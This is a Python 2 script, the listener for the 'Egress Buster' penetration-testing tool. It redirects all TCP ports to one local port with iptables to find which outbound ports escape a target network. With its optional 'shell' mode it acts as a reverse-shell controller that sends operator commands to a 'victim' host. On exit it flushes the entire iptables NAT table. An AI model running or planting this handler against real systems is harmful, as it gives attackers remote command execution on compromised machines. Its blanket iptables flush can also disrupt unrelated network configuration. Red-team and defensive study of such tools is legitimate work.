#!/usr/bin/python
#
#
# This is the listener for the egress buster - works both on posix and windows
#
# Egress Buster Listener - Written by: Dave Kennedy (ReL1K) (@HackingDave)
#
# Listener can only be run on Linux due to iptables support.
# 
import threading
import SocketServer
import sys
import subprocess
import time

# define empty variable
shell = ""

# assign arg params
try:
        ipaddr = sys.argv[1]
	eth = sys.argv[2]

# if we didnt put anything in args
except IndexError:
        print """
Egress Buster v0.2 - Find open ports inside a network

This will route all ports to a local port and listen on every port. This
means you can listen on all ports and do all ports as a way to egress bust.

Quick Egress Buster Listener written by: Dave Kennedy (@HackingDave) at TrustedSec

Arguments: local listening ip, eth interface for listener, optional flag for shell

Usage: python egress_listener.py <your_local_ip_addr> <eth_interface_for_listener> <optional_do_you_want_a_shell>

Example: python egress_listener.py 192.168.13.10 eth0 shell
        """
        sys.exit()

# assign shell
try: shell = sys.argv[3]
except: pass

# base class handler for socket server
class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):

	# handle the packet
        def handle(self):
        	self.data = self.request.recv(1024).strip()
        	print "%s connected on port: %s\n" % (self.client_address[0],self.data)
		if shell == "shell":
			while 1:
				request = raw_input("Enter the command to the victim: ")
				if request != "":
		        		self.request.sendall(request)
					if request == "quit" or request == "exit": break
					try:
						self.data = self.request.recv(1024).strip()
						print self.data

					except: pass

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pass

if __name__ == "__main__":

	try:
		print "[*] Inserting iptables to redirect allports to port 10900"
		subprocess.Popen("iptables -t nat -A PREROUTING -p tcp --dport 1:65535 -j REDIRECT --to-port 10900", shell=True).wait()
		# threaded server to handle multiple TCP connections
		socketserver = ThreadedTCPServer(('', 10900), ThreadedTCPRequestHandler)
                socketserver_thread = threading.Thread(target=socketserver.serve_forever)
                socketserver_thread.setDaemon(True)
                socketserver_thread.start()
		print "[*] Listening on all ports now. Hit control-c when finished."

	        while 1:
			try:
		        	time.sleep(1)

			except KeyboardInterrupt:
				print "\n[*]Exiting, flushing iptables to remove entries."
				subprocess.Popen("iptables -t nat -F", shell=True).wait()
				sys.exit()
	except Exception, e:
        	print "An issue occured, printing error: " + str(e)


